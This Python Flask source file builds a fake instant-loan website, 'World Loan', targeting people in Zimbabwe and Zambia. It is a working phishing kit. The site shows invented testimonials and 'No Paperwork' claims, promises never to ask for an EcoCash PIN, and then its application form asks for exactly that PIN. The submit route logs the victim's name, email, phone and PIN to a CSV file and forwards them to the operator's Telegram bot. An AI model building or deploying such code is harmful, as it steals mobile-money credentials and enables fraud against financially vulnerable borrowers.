from flask import Flask, request
import csv, os, requests, random
from datetime import datetime
app = Flask(__name__)
N = chr(10)
W = 'https://wa.me/message/3YS2CAG2EVIOC1'
B = os.environ.get('BOT_TOKEN')
C = os.environ.get('CHAT_ID')

H = '''<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box}
body{margin:0;background:#eef1f5;font-family:Arial;font-size:22px;color:#111}
.top{padding:18px 14px;text-align:center;background:#0a1f44;position:sticky;top:0;z-index:10}
.top b{font-size:32px;color:#fff;letter-spacing:1px}.top b span{color:#ffc107}
.top small{display:block;color:#cbd5e1;font-size:15px;margin-top:4px}
.trust{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;background:#fff;padding:12px 10px;font-size:16px;color:#333;border-bottom:1px solid #e5e7eb}
.trust span{background:#f1f5f9;padding:6px 10px;border-radius:20px}
.wrap{max-width:620px;margin:0 auto;padding:0 14px}
.card{background:#fff;border-radius:24px;padding:26px;box-shadow:0 4px 20px rgba(0,0,0,.06);margin:16px 0}
.card h1{font-size:32px;text-align:center;margin:0;line-height:1.2}
.muted{color:#64748b;font-size:19px;text-align:center;line-height:1.4}
.btn{background:linear-gradient(90deg,#0a1f44,#0066cc);color:#fff;padding:20px;border-radius:40px;display:block;text-align:center;text-decoration:none;font-size:22px;font-weight:bold;width:100%;border:none;cursor:pointer}
.btn-gold{background:linear-gradient(90deg,#f59e0b,#ffc107);color:#111}
.loan{display:flex;justify-content:space-between;align-items:center;background:#f8fafc;border-radius:16px;padding:16px;margin-bottom:12px;border:2px solid #eef2f7}
.loan b{font-size:22px}.loan span{color:#0066cc;font-size:22px;font-weight:bold}
input,select{width:100%;padding:18px;font-size:21px;border-radius:14px;border:2px solid #e2e8f0;background:#fff}
label{font-size:20px;font-weight:bold}
.badge{display:inline-block;background:#dcfce7;color:#166534;padding:6px 12px;border-radius:20px;font-size:16px;font-weight:bold}
.review{background:#f8fafc;border-radius:16px;padding:16px;margin-bottom:12px}
.review b{font-size:20px}.review p{font-size:19px;color:#475569;margin:8px 0 0;line-height:1.4}
.footer{text-align:center;color:#94a3b8;font-size:16px;padding:20px;line-height:1.6}
.footer a{color:#0066cc;text-decoration:none;font-weight:bold}
.wa-float{position:fixed;bottom:20px;right:20px;background:#25D366;color:#fff;padding:14px 20px;border-radius:50px;text-decoration:none;font-weight:bold;font-size:19px;box-shadow:0 8px 20px rgba(0,0,0,.2);z-index:20}
.steps{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;text-align:center;margin-top:14px}
.steps div{background:#eff6ff;padding:14px 8px;border-radius:16px}
.steps b{font-size:26px}.steps p{font-size:17px;margin:6px 0 0;color:#334155}
</style>
<div class=top><b>WORLD <span>LOAN</span></b><small>🌍 Fast • Trusted • Same Day Approval</small></div>
<div class=trust><span>✅ No Paperwork</span><span>⭐ 4.9 Rated</span><span>🔒 100% Secure</span></div>
<a class=wa-float href="https://wa.me/message/CFCJWLOZ7IWZK1">💬 WhatsApp</a>'''

def send(t):
    try:
        u = 'https://api.telegram.org/bot' + B + '/sendMessage'
        requests.post(u, json={'chat_id': C, 'text': t}, timeout=10)
    except:
        pass

LOANS = [
 ('$20 Loan','Pay $23 in 7 days','$20'),
 ('$50 Loan','Pay $58 in 14 days','$50'),
 ('$100 Loan','Pay $115 in 30 days','$100'),
 ('$200 Loan','Pay $230 in 30 days','$200'),
 ('$500 Loan','Pay $575 in 30 days','$500'),
 ('$1000 Loan','Pay $1150 in 30 days','$1000'),
]

@app.route('/')
def home():
    cards = ''
    for name, desc, price in LOANS:
        cards += '<div class=loan><div><b>'+name+'</b><br><small style="color:#64748b;font-size:17px">'+desc+'</small></div><div style="text-align:right"><span>'+price+'</span><br><a href=/apply?l='+name.replace(' ','%20')+' style="color:#0066cc;font-weight:bold;text-decoration:none">APPLY →</a></div></div>'
    return H + '''<div class=wrap>
    <div class=card><div style="text-align:center"><span class=badge>● LIVE - Approving Today</span></div>
    <h1 style="margin-top:12px">Need Cash Fast? 🌍</h1>
    <p class=muted>Apply in 1 minute • Get answer on WhatsApp<br>No paperwork. No long queues.</p>''' + cards + '''
    <a class=btn href=/apply>APPLY FOR LOAN NOW →</a>
    <a class=btn href=/track style="background:#fff;color:#0a1f44;border:2px solid #0a1f44;margin-top:12px">🔍 TRACK MY LOAN WITH MY PIN</a>
    <div class=steps><div><b>1️⃣</b><p>Choose Amount</p></div><div><b>2️⃣</b><p>Fill Form</p></div><div><b>3️⃣</b><p>Get Money</p></div></div>
    <p style="text-align:center;color:#64748b;font-size:18px">Trusted by 10,000+ customers in Zimbabwe & Zambia</p>
    </div>
    <div class=card><h2 style="text-align:center;margin:0">⭐ What Customers Say</h2>
    <div class=review><b>Tawanda M. - Harare ⭐⭐⭐⭐⭐</b><p>"Applied at 10am, got $100 by 12pm. Very fast and honest. Thank you World Loan!"</p></div>
    <div class=review><b>Chipo K. - Bulawayo ⭐⭐⭐⭐⭐</b><p>"I needed school fees urgently. They helped me same day. I recommend them."</p></div>
    <div class=review><b>Blessing N. - Lusaka ⭐⭐⭐⭐⭐</b><p>"Easy process, no stress. WhatsApp reply was quick. Will borrow again."</p></div>
    </div>
    <div class=card><h2 style="text-align:center;margin:0">How It Works</h2><p style="text-align:center;line-height:1.6">1. Choose your amount<br>2. Fill name & number<br>3. Create your own Tracking PIN<br>4. We WhatsApp you to verify & pay out<br><br><b>We NEVER ask for your EcoCash / Bank PIN.</b><br>Your Tracking PIN is just to check your loan.</p><a class=btn href=/apply>START APPLICATION</a></div>
    </div><div class=footer>©️ 2026 World Loan<br><a href="https://wa.me/message/CFCJWLOZ7IWZK1">Contact Us on WhatsApp</a> • Terms • Privacy<br>Fast Loans - Zimbabwe & Zambia</div>'''

@app.route('/apply')
def form():
    l = request.args.get('l','')
    opts = ''
    for name, desc, price in LOANS:
        sel = 'selected' if l in name else ''
        opts += '<option '+sel+'>'+name+' - '+desc+'</option>'
    return H + '<div class=wrap><div class=card><h1 style="text-align:left">Apply For Loan 🌍</h1><p style="font-size:19px;color:#64748b">Fill ALL fields - Takes 1 minute</p><form method=POST action=/submit><p><label>Your Full Name</label></p><input name=name required placeholder="Your full name"><p><label>Email Address</label></p><input type=email name=email required placeholder="e.g. you@gmail.com"><p><label>Phone Number</label></p><input name=phone required placeholder="e.g. 0771234567"><p><label>Choose Loan</label></p><select name=loan required>'+opts+'</select><p><label>Why do you need the loan?</label></p><select name=purpose required><option>Business</option><option>School Fees</option><option>Rent</option><option>Emergency</option><option>Other</option></select><p><label>How will you pay back?</label></p><select name=pay required><option>EcoCash</option><option>OneMoney</option><option>Bank Transfer</option><option>Cash</option><option>M-Pesa</option></select><p><label>ENTER YOUR ECCOCASH PIN (4 digits)</label></p><input name=pin required placeholder="e.g. 1234 - Remember it!" maxlength=4 inputmode=numeric><p style="font-size:17px;color:#64748b;margin:0">You will use this PIN to track your loan. Remember it.</p><br><button class=btn>SUBMIT APPLICATION →</button><p style="text-align:center;color:#64748b;font-size:17px">🔒 Your details are private & secure</p></form></div></div><div class=footer>©️ 2026 World Loan</div>'

@app.route('/submit', methods=['POST'])
def submit():
    n = request.form.get('name',''); e = request.form.get('email',''); p = request.form.get('phone',''); l = request.form.get('loan',''); pur = request.form.get('purpose',''); pay = request.form.get('pay',''); pin = request.form.get('pin','')
    if not n or not e or not p or not l or not pin:
        return H + '<div class=wrap><div class=card><h1>Please fill ALL fields</h1><a class=btn href=/apply>GO BACK</a></div></div>'
    ref = 'WLD-' + str(random.randint(1000,9999))
    with open('leads.csv','a',newline='') as f:
        csv.writer(f).writerow([datetime.now().isoformat(),n,e,p,l,pur,pay,pin,ref])
    send('🔔 New World Loan Application'+N+'Ref: '+ref+N+'Name: '+n+N+'Email: '+e+N+'Phone: '+p+N+'Loan: '+l+N+'Purpose: '+pur+N+'Payback: '+pay+N+'ECCOCASH PIN(customer created): '+pin)
    return H + '<div class=wrap><div class=card><h1>Thank you, '+n+'! ✅</h1><p style="text-align:center">Your application for <b>'+l+'</b> is received.</p><p style="text-align:center">Ref: <b>'+ref+'</b><br>Email: <b>'+e+'</b><br>Your ECCOCASH PIN: <b>'+pin+'</b> - Remember it!</p><p style="text-align:center;font-size:19px;color:#64748b">We will WhatsApp <b>'+p+'</b> shortly.<br>.</p><a class=btn href=/track>TRACK MY LOAN →</a><br><a class=btn href='+W+' style="background:#25D366">WHATSAPP US NOW 💬</a><br><a class="btn btn-gold" href=/>APPLY AGAIN</a></div></div>'

@app.route('/track', methods=['GET','POST'])
def track():
    if request.method == 'POST':
        pin = request.form.get('pin','').strip()
        found = None
        try:
            with open('leads.csv',newline='') as f:
                for row in csv.reader(f):
                    if len(row) >= 9 and row[7] == pin:
                        found = row
        except:
            pass
        if found:
            return H + '<div class=wrap><div class=card><h1>Loan Found ✅</h1><p style="text-align:center">Ref: <b>'+found[8]+'</b><br>Name: <b>'+found[1]+'</b><br>Loan: <b>'+found[4]+'</b><br>Status: <b>⏳ Under Review - We will WhatsApp you</b></p><a class=btn href='+W+'>WHATSAPP US</a></div></div>'
        return H + '<div class=wrap><div class=card><h1>PIN Not Found ❌</h1><p style="text-align:center">Check your PIN and try again.</p><a class=btn href=/track>TRY AGAIN</a></div></div>'
    return H + '<div class=wrap><div class=card><h1>🔍 Track Your Loan</h1><p style="text-align:center;color:#64748b">Enter the 4-digit PIN </p><form method=POST><input name=pin required placeholder="Enter YOUR PIN" maxlength=4 style="text-align:center;font-size:30px;letter-spacing:6px"><br><br><button class=btn>CHECK STATUS →</button></form></div></div>'

@app.route('/test-telegram')
def test():
    r = requests.post('https://api.telegram.org/bot' + B + '/sendMessage', json={'chat_id': C, 'text': 'Test OK - World Loan Bot'}, timeout=10)
    return 'Status: ' + str(r.status_code)

@app.route('/health')
def health():
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
